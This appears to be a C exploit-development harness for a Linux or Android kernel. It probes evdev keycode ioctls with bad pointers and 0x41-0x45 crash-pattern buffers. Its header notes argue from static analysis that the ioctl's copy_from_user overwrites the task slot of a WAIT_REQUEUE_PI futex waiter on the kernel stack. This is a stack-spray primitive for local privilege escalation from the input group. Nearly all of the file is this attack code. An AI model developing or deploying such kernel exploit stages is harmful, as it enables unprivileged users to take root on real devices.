/**
 * test_evdev_cfu.c — EVIOCGKEYCODE_V2 / related CFU vs CORRECTED waiter
 *
 * Static [BIN]:
 *   evdev_ioctl_handler frame 0xa0, CFU 0x28 @ SP+8
 *   ioctl nest 0xD0 → abs [stack_top-0x168, -0x190)
 *   WAIT_REQUEUE_PI task @ stack_top-0x168 → first 8B of CFU = task slot
 *
 * shell is in group input; event* is 0660 root:input.
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* Linux input_keymap_entry is 0x28 */
struct keymap_entry_local {
  uint8_t flags;
  uint8_t len;
  uint16_t index;
  uint32_t keycode;
  uint8_t scancode[32];
} __attribute__((packed));

#ifndef EVIOCGKEYCODE_V2
#define EVIOCGKEYCODE_V2 _IOC(_IOC_READ | _IOC_WRITE, 'E', 0x04, 0x28)
#endif
#ifndef EVIOCSKEYCODE_V2
#define EVIOCSKEYCODE_V2 _IOC(_IOC_WRITE, 'E', 0x04, 0x28)
#endif

static void try_ioctl(int fd, const char *tag, unsigned long req, void *arg) {
  errno = 0;
  int r = ioctl(fd, req, arg);
  int e = errno;
  printf("  %-28s ret=%d errno=%d (%s)%s\n", tag, r, e,
         r < 0 ? strerror(e) : "OK",
         e == EFAULT ? "  ← CFU EFAULT" : "");
}

static int open_event(const char *path) {
  int fd = open(path, O_RDWR);
  if (fd >= 0) {
    printf("open %s O_RDWR ok fd=%d\n", path, fd);
    return fd;
  }
  printf("open %s O_RDWR errno=%d; try O_RDONLY\n", path, errno);
  fd = open(path, O_RDONLY);
  if (fd >= 0)
    printf("open %s O_RDONLY ok fd=%d\n", path, fd);
  else
    printf("open %s O_RDONLY errno=%d\n", path, errno);
  return fd;
}

int main(void) {
  const char *paths[] = {
      "/dev/input/event0", "/dev/input/event1", "/dev/input/event2",
      "/dev/input/event3", "/dev/input/event6", NULL};
  int fd = -1;
  const char *used = NULL;
  for (int i = 0; paths[i]; i++) {
    fd = open_event(paths[i]);
    if (fd >= 0) {
      used = paths[i];
      break;
    }
  }
  if (fd < 0) {
    printf("FAIL: no event device openable\n");
    return 1;
  }
  printf("using %s\n\n", used);

  struct keymap_entry_local ke;
  memset(&ke, 0, sizeof(ke));
  ke.index = 0;
  ke.len = 1;
  ke.scancode[0] = 0;

  printf("=== A: valid keymap entry ===\n");
  try_ioctl(fd, "EVIOCGKEYCODE_V2 valid", EVIOCGKEYCODE_V2, &ke);
  printf("  after get: keycode=%u len=%u\n", ke.keycode, ke.len);

  printf("\n=== B: bad pointer (CFU reach?) ===\n");
  try_ioctl(fd, "EVIOCGKEYCODE_V2 bad", EVIOCGKEYCODE_V2, (void *)(uintptr_t)0x8);
  try_ioctl(fd, "EVIOCSKEYCODE_V2 bad", EVIOCSKEYCODE_V2, (void *)(uintptr_t)0x8);

  printf("\n=== C: crash-pattern buffer (40B) for residual tests ===\n");
  uint64_t buf[5];
  buf[0] = 0x4141414141414141ULL; /* predicted task slot @ CFU+0 */
  buf[1] = 0x4242424242424242ULL;
  buf[2] = 0x4343434343434343ULL;
  buf[3] = 0x4444444444444444ULL;
  buf[4] = 0x4545454545454545ULL;
  try_ioctl(fd, "EVIOCGKEYCODE_V2 pattern", EVIOCGKEYCODE_V2, buf);
  try_ioctl(fd, "EVIOCSKEYCODE_V2 pattern", EVIOCSKEYCODE_V2, buf);

  /* Also classic 8-byte keycode ioctls */
  unsigned int kc[2] = {0, 0};
  try_ioctl(fd, "EVIOCGKEYCODE classic", EVIOCGKEYCODE, kc);

  close(fd);
  printf("\nStatic claim: task @ stack_top-0x168 covered by CFU 0x28 @ "
         "evdev SP+8 (ioctl nest 0xD0).\n");
  return 0;
}
